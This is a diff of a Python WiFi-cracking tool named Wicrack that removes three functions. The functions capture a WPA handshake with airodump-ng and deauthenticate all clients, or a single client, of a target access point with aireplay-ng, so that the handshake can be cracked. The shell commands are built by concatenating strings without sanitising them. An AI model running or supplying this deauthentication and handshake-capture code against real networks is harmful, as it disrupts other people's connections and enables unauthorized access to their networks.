@@ -97,32 +97,6 @@ class Wicrack(object):
         return inface
 
 
-def capture_handshake(bssid, channel, interface='wlan0'):
-    """Capture Handshake with airodump-ng"""
-    print('Capturing Handshake')
-    os.system("rm *.cap 2>/dev/null")
-    os.popen("xterm -T 'Capture Handshake' -geometry -500+1 -e '"+\
-             "airodump-ng --bssid "+bssid+" --channel "+str(channel)+\
-             " --write wicrack --output-format cap "+interface+"'")
-
-def deauthenticate_all(bssid, interface='wlan0'):
-    """Deauthenticate all users on interface: %s"""%interface
-    print('Deauthenticating Connected Devices')
-    os.popen("xterm -T 'Deauthenticating' -geometry -1+1 -e '"+\
-             "aireplay-ng --deauth 5 -a "+bssid+" "+interface+"'")
-    time.sleep(5)
-    os.system("killall airodump-ng")
-
-def deauthenticate_one(bssid, station, interface='wlan0'):
-    """Deauthenticate one user (%s) on interface: %s"""%(station, interface)
-    print('Deauthenticating Connected Devices')
-    os.popen("xterm -T 'Deauthenticating' -geometry -1+1 -e '"+\
-             "aireplay-ng --deauth 5 -a "+bssid+" -c "+station+\
-             " "+interface+"'")
-    time.sleep(5)
-    os.system("killall airodump-ng")
-
-
 if __name__ == "__main__":
         Wicrack()
 
